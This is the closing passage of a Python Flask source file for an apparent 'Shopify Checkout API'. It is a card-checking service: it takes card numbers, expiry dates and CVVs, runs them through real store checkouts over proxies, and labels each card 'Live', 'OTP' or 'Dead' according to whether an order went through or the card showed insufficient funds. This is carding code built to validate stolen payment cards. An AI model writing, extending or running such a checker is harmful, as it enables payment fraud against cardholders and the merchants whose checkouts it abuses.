        return False, f"Proxy error: {str(e)}", "UNKNOWN", "0", "USD", "0", "0", "0"
    except asyncio.TimeoutError:
        return False, "Timeout", "UNKNOWN", "0", "USD", "0", "0", "0"
    except Exception as e:
        return False, f"Error: {str(e)}", "UNKNOWN", "0", "USD", "0", "0", "0"

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc', '').strip()
        proxy_str = request.args.get('proxy')
        variant_id = request.args.get('variant')
        
        if not site: return jsonify({"error": "Missing site", "status": "Dead"}), 400
        if not cc_string: return jsonify({"error": "Missing cc", "status": "Dead"}), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc, mes, ano, cvv = cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv']
        except ValueError as e:
            return jsonify({"error": str(e), "status": "Dead"}), 400
        
        success, message, gateway, total, currency, subtotal, tax, ship = asyncio.run(
            process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
        )
        
        clean_response = extract_clean_response(message)
        hit_status = _classify_status(success, clean_response)
        
        if hit_status in ["ORDER_PLACED", "INSUFFICIENT_FUNDS"]: final_status = "Live"
        elif hit_status == "OTP_REQUIRED": final_status = "OTP"
        else: final_status = "Dead"

        return jsonify({
            "Status": final_status,
            "Response": clean_response,
            "RawResponse": message,
            "Gateway": gateway,
            "Total": total,
            "Currency": currency,
            "cc": cc_string
        })
        
    except Exception as e:
        return jsonify({"Status": "Dead", "Response": "ERROR", "RawResponse": str(e), "cc": request.args.get('cc', '')}), 500

@app.route("/")
def home():
    return "<h1>Shopify Checkout API</h1>"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
